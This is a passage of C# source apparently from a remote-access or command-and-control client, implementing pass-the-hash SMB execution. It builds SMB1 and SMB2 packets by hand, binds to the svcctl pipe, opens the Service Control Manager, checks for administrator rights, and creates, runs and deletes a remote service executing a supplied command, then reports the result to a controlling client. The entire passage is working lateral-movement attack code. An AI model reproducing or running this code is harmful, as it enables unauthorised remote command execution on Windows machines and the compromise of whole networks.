                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Service Failed to Start", false).Execute(client);
                                            }
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }

                                            OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMDeleteServiceW(SMB_service_context_handle);
                                            SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x04, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadAndXRequest";
                                            SMB_client_stage_next = "CloseServiceHandle";
                                            SMB_close_service_handle_stage = 1;

                                        }
                                        break;
                                    case "CloseServiceHandle":
                                        {
                                            OrderedDictionary packet_SCM_data = new OrderedDictionary();
                                            if (SMB_close_service_handle_stage == 1)
                                            {
                                                SMB_close_service_handle_stage++;
                                                packet_SCM_data = PTHSMBExecHelper.GetPacketSCMCloseServiceHandle(SMB_service_context_handle);
                                            }
                                            else
                                            {
                                                SMBClientStage = "CloseRequest";
                                                packet_SCM_data = PTHSMBExecHelper.GetPacketSCMCloseServiceHandle(SMB_service_manager_context_handle);
                                            }
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x2f }, new byte[] { 0x18 }, new byte[] { 0x05, 0x28 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x05, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, null);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBWriteAndXRequest(SMB_FID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            int RPC_data_length = SMB_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, RPC_data);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SCM_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                        }
                                        break;
                                    case "CloseRequest":
                                        {
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x04 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBCloseRequest(new byte[] { 0x00, 0x40 });
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "TreeDisconnect";
                                        }
                                        break;
                                    case "TreeDisconnect":
                                        {
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x71 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, SMB_tree_ID, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBTreeDisconnectRequest();
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "Logoff";
                                        }
                                        break;
                                    case "Logoff":
                                        {
                                            packet_SMB_header = PTHSMBExecHelper.GetPacketSMBHeader(new byte[] { 0x74 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0x34, 0xfe }, process_ID_Bytes, SMB_user_ID);

                                            if (SMB_signing)
                                            {
                                                packet_SMB_header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                                SMB_signing_counter += 2;
                                                byte[] SMB_signing_sequence = PTHSMBExecHelper.CombineByteArray(BitConverter.GetBytes(SMB_signing_counter), new byte[] { 0x00, 0x00, 0x00, 0x00 });
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_signing_sequence;
                                            }
                                            byte[] SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            OrderedDictionary packet_SMB_data = PTHSMBExecHelper.GetPacketSMBLogoffAndXRequest();
                                            byte[] SMB_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_data);
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB_header.Length, SMB_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);

                                            if (SMB_signing)
                                            {
                                                MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();
                                                byte[] SMB_Sign = PTHSMBExecHelper.CombineByteArray(session_key, SMB_header);
                                                SMB_Sign = PTHSMBExecHelper.CombineByteArray(SMB_Sign, SMB_data);
                                                byte[] SMB_Signature = MD5Crypto.ComputeHash(SMB_Sign);
                                                SMB_Signature = PTHSMBExecHelper.getByteRange(SMB_Signature, 0, 7);
                                                packet_SMB_header["SMBHeader_Signature"] = SMB_Signature;
                                                SMB_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "exit";
                                        }
                                        break;
                                }

                            }
                        }
                        else
                        {
                            SMBClientStage = "TreeConnect";
                            while (SMBClientStage != "exit" && SMBExec_failed == false)
                            {
                                switch (SMBClientStage)
                                {
                                    case "TreeConnect":
                                        {
                                            SMB2_message_ID++;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x03, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };

                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2TreeConnectRequest(SMB_path_bytes);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "CreateRequest";
                                        }
                                        break;
                                    case "CreateRequest":
                                        {
                                            SMB2_tree_ID = new byte[] { 0x01, 0x00, 0x00, 0x00 };
                                            SMB_named_pipe_bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                            SMB2_message_ID++;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x05, 0x0 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2CreateRequestFile(SMB_named_pipe_bytes);
                                            packet_SMB2_data["SMB2CreateRequestFIle_Share_Access"] = new byte[] { 0x07, 0x00, 0x00, 0x00 };
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "RPCBind";
                                        }
                                        break;
                                    case "RPCBind":
                                        {
                                            SMB_named_pipe_bytes = new byte[] { 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00 }; //svcctl
                                            SMB2_message_ID++;
                                            SMB_file_ID = PTHSMBExecHelper.getByteRange(SMBClientReceive, 132, 147);
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCBind(1, new byte[] { 0xb8, 0x10 }, new byte[] { 0x01 }, new byte[] { 0x0, 0x00 }, SMB_named_pipe_UUID, new byte[] { 0x02, 0x00 });
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "OpenSCManagerW";
                                        }
                                        break;
                                    case "ReadRequest":
                                        {
                                            Thread.Sleep(sleep);
                                            SMB2_message_ID++;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x08, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            packet_SMB2_header["SMB2Header_CreditCharge"] = new byte[] { 0x10, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }

                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2ReadRequest(SMB_file_ID);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                            {
                                                SMBClientStage = SMB_client_stage_next;
                                            }
                                            else
                                            {
                                                SMBClientStage = "StatusPending";
                                            }

                                        }
                                        break;

                                    case "StatusPending":
                                        {
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 12, 15)) != "03-01-00-00")
                                            {
                                                SMBClientStage = SMB_client_stage_next;
                                            }
                                        }
                                        break;
                                    case "OpenSCManagerW":
                                        {
                                            SMB2_message_ID = 30;
                                            packet_SMB2_header = PTHSMBExecHelper.GetPacketSMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMOpenSCManagerW(SMB_service_bytes, SMB_service_length);
                                            SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = PTHSMBExecHelper.GetPacketRPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x0f, 0x00 }, null);
                                            byte[] RPC_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = PTHSMBExecHelper.GetPacketSMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            byte[] SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            int RPC_data_Length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_NetBIOS_session_service = PTHSMBExecHelper.GetPacketNetBIOSSessionService(SMB2_header.Length, RPC_data_Length);
                                            byte[] NetBIOS_session_service = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_NetBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_header, SMB2_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, RPC_data);
                                                SMB2_Sign = PTHSMBExecHelper.CombineByteArray(SMB2_Sign, SCM_data);
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = PTHSMBExecHelper.getByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(NetBIOS_session_service, SMB2_header);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SMB2_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, RPC_data);
                                            SMB_client_send = PTHSMBExecHelper.CombineByteArray(SMB_client_send, SCM_data);
                                            SMBClientStream.Write(SMB_client_send, 0, SMB_client_send.Length);
                                            SMBClientStream.Flush();
                                            SMBClientStream.Read(SMBClientReceive, 0, SMBClientReceive.Length);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "CheckAccess";

                                        }
                                        break;

                                    case "CheckAccess":
                                        {
                                            if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 128, 131)) == "00-00-00-00" && BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 108, 127)) != "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00")
                                            {
                                                SMB_service_manager_context_handle = PTHSMBExecHelper.getByteRange(SMBClientReceive, 108, 127);
                                                if (SMB_execute)
                                                {
                                                    OrderedDictionary packet_SCM_data = PTHSMBExecHelper.GetPacketSCMCreateServiceW(SMB_service_manager_context_handle, SMB_service_bytes, SMB_service_length, SMBExec_command, SMBExec_command_length_bytes);
                                                    SCM_data = PTHSMBExecHelper.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                                    if (SCM_data.Length < SMB_split_index)
                                                    {
                                                        SMBClientStage = "CreateServiceW";
                                                    }
                                                    else
                                                    {
                                                        SMBClientStage = "CreateServiceW_First";
                                                    }
                                                }
                                                else
                                                {
                                                    new Packets.ClientPackets.DoSMBExecResponse("Execution Succeeded: User is a local Administrator", false).Execute(client);
                                                    SMB2_message_ID += 20;
                                                    SMB_close_service_handle_stage = 2;
                                                    SMBClientStage = "CloseServiceHandle";
                                                }

                                            }
                                            else if (BitConverter.ToString(PTHSMBExecHelper.getByteRange(SMBClientReceive, 128, 131)) == "05-00-00-00")
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: User is not a local Administrator or does not have the required permissions", false).Execute(client);
                                                SMBExec_failed = true;
                                            }
                                            else
                                            {
                                                new Packets.ClientPackets.DoSMBExecResponse("Execution Failed: Unknown Error", false).Execute(client);
